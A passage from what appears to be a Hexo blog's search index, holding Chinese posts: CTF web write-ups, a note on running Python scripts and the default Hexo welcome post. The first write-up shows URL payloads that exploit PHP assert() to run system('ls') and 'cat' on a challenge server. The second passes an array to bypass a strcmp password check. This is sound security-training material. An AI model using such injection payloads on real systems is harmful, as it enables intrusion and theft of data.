<p>可以发现一共有三个page：home，about，contact<br>还有一个可能存在的page：flag.php<br>2、<a href="http://web.jarvisoj.com:32798/?page=flag.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=flag.php</a><br>显示：That file doesn’t exist!<br>3、查看about里面有：PHP，GIT,Bootstrap<br>可能有源码泄露，联系到about中有Git，使用GitHack下载源码<br>4、使用GitHash下载源码方法：<br>cmd，并切换到已经下载GitHash-master的py文件目录下<br>python GitHash.py url.git<br>python GitHash.py <a href="http://web.jarvisoj.com:32798/.git" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/.git</a></p>
<p><img src="/2017/12/30/babyphp/02.png" alt=""></p>
<p>显示有index.php，about.php，contact.php，flag.php，home.php<br>在GitHash-master的目录下可以找到一个web.jarvisoj.com_32798的文件夹<br>里面有templates和index.php文件<br>*Templates文件夹：该文件夹中存储着常用程序的模板文件，如winword.doc、powerpnt.ppt、excel.xls等。<br>模板就是包含有段落结构、字体样式和页面布局等元素的样式。<br>它决定了文档的基本结构和设置的样式。<br>5、查看了flag.php：<br>&lt;?php<br>// TODO<br>//$FLAG = ‘’;<br>?&gt;<br>6、最后查看index.php：<br>&lt;?php<br>if (isset($_GET[‘page’])){</p>
<p>$page = $_GET[‘page’];<br>}<br>else {<br>$page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;<br>/<em>PHP assert()<br>assert — 检查一个断言是否为 FALSE<br>PHP 5<br>bool assert ( mixed $assertion [, string $description ] )<br>PHP 7<br>bool assert ( mixed $assertion [, Throwable $exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。<br>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。<br>这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；<br>在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。<br>断言这个功能应该只被用来调试。<br>你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。<br>断言不应该用于普通运行时操作，类似输入参数的检查。<br>作为一个经验法则，在断言禁用时你的代码也应该能够正确地运行。<br>assert() 的行为可以通过 assert_options() 来配置，或者手册页面上描述的 .ini 设置。<br>assert_options() ASSERT_CALLBACK 配置指令允许设置回调函数来处理失败的断言。<br>assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！</em>/<br>其实真看不懂什么意思 ψ(._.)&gt; 谁来教我<br>php中assert本来是用于调试的，如果assert方法内的代码不为true，则给个Warning提醒。<br>如下面的代码：<br>&lt;?php assert(‘1==2’); ?&gt;<br>执行后会有如下输出： Warning: assert(): Assertion “1==2” failed in D:\green\APMServ5.2.6\www\htdocs\phpinfo.php on line 2 有个assert_option方法可以对assert进行一些控制。<br>7、构造assert()函数会运行接收的语句</p>
<p><1><a href="http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls</a> templates/;”).’<br>显示：about.phpcontact.phpflag.phphome.phpabout.phpcontact.phpflag.phphome.phpThat file doesn’t exist!</1></p>
<p><2><a href="http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False</a> and system(‘cat templates/flag.php’);//<br>显示：<br>&lt;?php<br>// TODO<br>//$FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}’;<br>?&gt;<br>That file doesn’t exist!<br>‘,’..’)===False根据assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”)<br>‘,’..’)===False为真<br>system(‘cat templates/flag.php’)<br>显示flag.php的内容<br>*system()函数<br>system — 执行外部程序，并且显示输出<br>string system ( string $command [, int &amp;$return_var ] )<br>参数<br>command<br>要执行的命令。<br>return_var<br>如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。<br>返回值<br>成功则返回命令输出的最后一行， 失败则返回 FALSE<br>FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}</2></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[checkpass]]></title>
      <url>/2017/12/30/checkpass/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>查看源码<br>&lt;?php<br>$pass=@$_POST[‘pass’];<br>$pass1=<em>;//被隐藏起来的密码<br>if(isset($pass))<br>{<br>if(@!strcmp($pass,$pass1)){<br>echo “flag:nctf{</em>}”;<br>}else{<br>echo “the pass is wrong!”;<br>}<br>}else{<br>echo “please input pass!”;<br>}<br>?&gt;<br>php的strcmp函数，传入一个array就好了<br>strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。<br>如果传入给出strcmp()的参数是数字呢？<br>$array=[1,2,3];<br>var_dump(strcmp($array,’123’)); //null,在某种意义上null也就是相当于false。<br><a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/</a><br>使用hackbar插件<br>load URL：<a href="http://chinalover.sinaapp.com/web21/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/index.php</a><br>post data：pass[]=1 //传入一个数组</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在命令行里运行python脚本]]></title>
      <url>/2017/12/30/%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%87%8C%E8%BF%90%E8%A1%8Cpython%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>打开文本编辑器，notepad<br>语言设置成python<br>脚本第一行一定要写上 #! /usr/bin/env python<br>编辑好之后，将文件保存成 .py格式<br>cd 到运行文件所在目录<br>运行python 文件名.py<br>cmd命令行中输入 python<br>把脚本文件拖拽到当前光标位置，回车<br>报错：<br>File ““ , line 1<br>python hello.py<br>SyntaxError：invalid synta<br>原因：Python命令行中，运行Python代码<br>“python hello.py”是一个脚本命令，不是python代码</p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/12/30/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
